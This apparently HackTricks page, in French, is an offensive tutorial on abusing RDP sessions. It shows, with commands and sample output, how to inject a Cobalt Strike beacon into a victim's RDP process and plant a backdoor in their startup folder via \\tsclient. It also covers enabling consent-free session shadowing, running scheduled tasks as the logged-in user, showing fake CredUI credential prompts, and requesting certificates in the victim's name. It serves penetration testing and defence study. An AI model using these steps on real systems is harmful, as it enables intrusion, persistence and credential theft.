# Abus des sessions RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Si le **groupe externe** dispose d'un **accès RDP** à un **ordinateur** du domaine actuel, un **attaquant** pourrait **compromettre cet ordinateur et l'attendre**.

Une fois que cet utilisateur s'est connecté via RDP, l'**attaquant peut pivoter vers la session de cet utilisateur** et abuser de ses permissions dans le domaine externe.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Vérifiez **d’autres moyens de voler des sessions avec d’autres outils** [**sur cette page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Si un utilisateur accède via **RDP à une machine** où un **attaquant** l’**attend**, l’attaquant pourra **injecter un beacon dans la session RDP de l’utilisateur** et, si la **victime a monté son lecteur** lors de l’accès via RDP, l’**attaquant pourrait y accéder**.

Dans ce cas, vous pourriez simplement **compromettre** l’**ordinateur d’origine de la victime** en écrivant une **backdoor** dans le **dossier de démarrage**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Si vous êtes **local admin** sur un hôte où la victime possède déjà une **active RDP session**, vous pouvez être en mesure de **view/control ce bureau sans voler le mot de passe ni effectuer de dumping de LSASS**.<sup>[[1]](#references)</sup>

Cela dépend de la stratégie **Remote Desktop Services shadowing** stockée dans :<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valeurs intéressantes :

- `0` : Désactivé
- `1` : `EnableInputNotify` (contrôle, approbation de l’utilisateur requise)
- `2` : `EnableInputNoNotify` (contrôle, **aucune approbation de l’utilisateur**)
- `3` : `EnableNoInputNotify` (affichage seul, approbation de l’utilisateur requise)
- `4` : `EnableNoInputNoNotify` (affichage seul, **aucune approbation de l’utilisateur**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Ceci est particulièrement utile lorsqu'un utilisateur privilégié connecté via RDP a laissé ouvert un bureau déverrouillé, une session KeePass, une console MMC, une session de navigateur ou un shell d'administration.

## Tâches planifiées en tant qu'utilisateur connecté

Si vous êtes **administrateur local** et que l'utilisateur cible est **actuellement connecté**, Task Scheduler peut lancer du code **en tant que cet utilisateur sans son mot de passe**.<sup>[[1]](#references)[[4]](#references)</sup>

Cela transforme la session d'ouverture de session existante de la victime en primitive d'exécution :
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notes :

- Si l'utilisateur **n'est pas connecté**, Windows exige généralement le mot de passe pour créer une tâche qui s'exécute sous son identité.
- Si l'utilisateur **est connecté**, la tâche peut réutiliser le contexte de connexion existant.
- Il s'agit d'une méthode pratique pour exécuter des actions GUI ou lancer des binaires dans la session de la victime sans toucher à LSASS.

## Abuse de l'invite CredUI depuis la session de la victime

Une fois que vous pouvez exécuter du code **dans le bureau interactif de la victime** (par exemple via **Shadow RDP** ou **une scheduled task exécutée sous l'identité de cet utilisateur**), vous pouvez afficher une **véritable invite d'informations d'identification Windows** à l'aide des API CredUI et récupérer les identifiants saisis par la victime.<sup>[[1]](#references)</sup>

APIs pertinentes :

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flux typique :

1. Lancer un binaire dans la session de la victime.
2. Afficher une invite d'authentification de domaine correspondant à l'image de marque du domaine actuel.
3. Décompresser le buffer d'authentification retourné.
4. Valider les identifiants fournis et, éventuellement, continuer à afficher l'invite jusqu'à ce que des identifiants valides soient saisis.

Cette technique est utile pour le **phishing sur l'hôte**, car l'invite est rendue par les APIs Windows standard plutôt que par un faux formulaire HTML.

## Demander un PFX dans le contexte de la victime

La même primitive de **scheduled-task-as-user** peut être utilisée pour demander un **certificat/PFX sous l'identité de la victime connectée**. Ce certificat pourra ensuite être utilisé pour l'**authentification AD** sous l'identité de cet utilisateur, ce qui évite entièrement le vol de mot de passe.<sup>[[1]](#references)[[5]](#references)</sup>

Flux général :

1. Obtenir les droits d'**administrateur local** sur un hôte où la victime est connectée.
2. Exécuter la logique d'inscription/export sous l'identité de la victime à l'aide d'une **scheduled task**.
3. Exporter le **PFX** obtenu.
4. Utiliser le PFX pour PKINIT / l'authentification AD basée sur un certificat.

Consultez les pages AD CS pour les abus associés :

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Références

- [1] [SensePost - Des réseaux plats aux domaines verrouillés avec des modèles de segmentation par niveaux](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Shadow Remote Desktop](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - PR #465 du plugin Shadow RDP](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - Module schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Demander un PFX via une scheduled task, PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
